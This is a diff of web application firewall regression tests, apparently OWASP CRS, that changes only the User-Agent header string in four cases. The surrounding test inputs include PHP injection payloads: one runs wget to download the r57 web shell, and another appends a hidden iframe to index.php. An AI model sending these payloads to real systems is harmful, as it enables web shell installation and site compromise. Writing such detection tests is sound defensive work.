@@ -18,7 +18,7 @@ tests:
               Host: localhost
               Keep-Alive: '300'
               Proxy-Connection: keep-alive
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
             uri: /?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O
@@ -38,7 +38,7 @@ tests:
               Host: localhost
               Keep-Alive: '300'
               Proxy-Connection: keep-alive
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
             uri: /?foo=%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E
@@ -54,7 +54,7 @@ tests:
             headers:
               Accept: "*/*"
               Host: "localhost"
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
             uri: /?foo=somePhpWouldGoHere%5B%2Fphp%5D
@@ -70,7 +70,7 @@ tests:
             headers:
               Accept: "*/*"
               Host: "localhost"
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
             uri: /?foo=somePhpWouldGoHere%5B%5Cphp%5D
